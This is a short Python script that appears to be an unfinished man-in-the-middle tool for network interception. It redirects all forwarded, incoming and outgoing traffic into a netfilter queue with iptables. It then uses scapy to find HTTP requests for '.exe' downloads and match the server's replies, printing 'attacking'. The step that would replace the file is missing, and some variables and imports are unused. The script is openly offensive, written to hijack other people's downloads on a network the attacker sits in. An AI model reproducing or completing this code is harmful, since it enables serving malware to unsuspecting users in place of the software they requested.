
import netfilterqueue
import scapy.all as scapy
import scapy_http
import os

ack_list =[]

acklist = []
 
def process(pack):
    scapypack = scapy.IP(pack.get_payload())
    if scapypack.haslayer(scapy.Raw):
        if scapypack[scapy.TCP].dport == 80:
            if b".exe" in scapypack[scapy.Raw].load:
                print("EXE REQUEST")
                acklist.append(scapypack[scapy.TCP].ack)
                print(scapypack.show())
        elif scapypack[scapy.TCP].sport == 80:
            if scapypack[scapy.TCP].seq in acklist:
                acklist.remove(scapypack[scapy.TCP].seq)
                print("attacking")
                print(scapypack.show())
 
 
    pack.accept()
os.system('iptables -I OUTPUT -j NFQUEUE --queue-num {}'.format('1'))   
os.system('iptables -I INPUT -j NFQUEUE --queue-num {}'.format('1')) 
os.system('iptables -I FORWARD -j NFQUEUE --queue-num {}'.format('1'))

queue = netfilterqueue.NetfilterQueue()

queue.bind(1, process)

queue.run()

